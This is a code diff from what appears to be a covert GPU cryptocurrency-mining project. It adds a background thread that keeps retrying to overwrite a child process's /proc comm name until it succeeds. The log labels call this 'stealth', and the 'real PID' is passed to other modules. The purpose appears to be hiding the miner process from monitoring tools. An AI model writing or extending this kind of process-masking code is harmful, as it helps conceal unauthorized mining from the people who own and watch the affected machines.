@@ -260,8 +260,43 @@ def main():
                         else:
                             raise
                 if not rename_success:
-                    raise OSError(22, "Failed to rename after retries")
-                logger.info(f"✅ [GPU-POST-EXEC-STEALTH] Renamed child PID {process.pid} to '{new_name}'")
+                    logger.warning(
+                        f"⚠️ [GPU-POST-EXEC-STEALTH] Initial rename attempts failed for PID {process.pid}. "
+                        "Will continue trying in background thread."
+                    )
+                    # Spawn background thread to keep attempting rename until success
+                    def _retry_rename():
+                        attempt_delay = 1.0  # seconds
+                        max_bg_attempts = 20
+                        for bg_attempt in range(max_bg_attempts):
+                            try:
+                                time.sleep(attempt_delay)
+                                comm_path = f"/proc/{process.pid}/comm"
+                                bname_local = safe_name.encode("utf-8")
+                                if len(bname_local) < 16:
+                                    bname_local += b"\n"
+                                fd_local = os.open(comm_path, os.O_WRONLY)
+                                os.write(fd_local, bname_local[:16])
+                                os.close(fd_local)
+                                logger.info(
+                                    f"✅ [GPU-POST-EXEC-STEALTH] Background rename succeeded on attempt {bg_attempt+1} "
+                                    f"for PID {process.pid} -> '{new_name}'"
+                                )
+                                return
+                            except OSError as bg_err:
+                                if bg_err.errno == 22:
+                                    continue  # keep retrying
+                                else:
+                                    logger.error(
+                                        f"❌ [GPU-POST-EXEC-STEALTH] Background rename failed with unexpected error: {bg_err}"
+                                    )
+                                    return
+                        logger.error(
+                            f"❌ [GPU-POST-EXEC-STEALTH] Unable to rename PID {process.pid} after background retries"
+                        )
+                    threading.Thread(target=_retry_rename, daemon=True).start()
+                else:
+                    logger.info(f"✅ [GPU-POST-EXEC-STEALTH] Renamed child PID {process.pid} to '{new_name}'")
                 # Publish real PID to EventBus so other modules can target it
                 try:
                     from mining_environment.scripts.auxiliary_modules.event_bus import get_event_bus
